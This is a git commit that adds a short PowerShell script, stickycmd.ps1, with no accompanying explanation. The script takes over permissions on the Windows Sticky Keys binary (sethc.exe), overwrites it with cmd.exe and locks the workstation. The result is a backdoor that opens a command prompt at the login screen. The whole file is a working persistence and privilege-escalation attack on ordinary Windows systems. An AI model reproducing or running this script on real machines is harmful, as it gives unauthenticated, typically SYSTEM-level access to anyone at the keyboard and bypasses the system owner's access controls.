6fd4a18f5346c67df5a8c3545d2a4d19e91231d4
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-05-03 15:21:22 +0100

    Add files via upload

---
+++ stickycmd.ps1
@@ -0,0 +1,11 @@
+﻿$a = get-acl "C:\Windows\System32\sethc.exe"
+$me = whoami
+$b = New-Object System.Security.AccessControl.FileSystemAccessRule("$me","FullControl","Allow")
+$a.SetAccessRule($b)
+$a | Set-Acl "C:\Windows\System32\sethc.exe"
+
+Copy-Item "C:\Windows\System32\cmd.exe" -Destination "$env:TEMP\sethc.exe"
+Remove-Item "C:\Windows\System32\sethc.exe" -Force
+Move-Item "$env:TEMP\sethc.exe" -Destination "C:\Windows\System32\sethc.exe"
+
+rundll32.exe user32.dll,LockWorkStation
